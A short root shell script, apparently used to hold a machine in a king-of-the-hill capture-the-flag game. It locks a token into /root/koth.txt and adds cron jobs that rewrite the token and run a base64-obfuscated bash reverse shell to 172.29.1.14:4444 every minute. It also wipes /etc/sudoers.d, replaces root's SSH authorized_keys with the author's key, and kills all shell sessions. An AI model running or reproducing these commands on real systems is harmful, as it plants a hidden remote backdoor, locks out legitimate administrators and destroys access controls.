echo '134c0266-c9a9-44f8-806d-610b1a2bbba3' > /root/koth.txt
chattr +i /root/koth.txt
(echo "* * * * * /bin/bash -c 'echo 134c0266-c9a9-44f8-806d-610b1a2bbba3 > /root/koth.txt'") | crontab -
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTcyLjI5LjEuMTQvNDQ0NCAwPiYxKSAm|base64 -d|bash'") | crontab -
rm -rf /etc/sudoers.d/*
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOZRKQoH5j99H9vTDoZ4Vozk4PcfVnIYX/7TCDqOEWPQ bvillano@yuggoth' > /root/.ssh/authorized_keys
pkill -9 bash
pkill -9 sh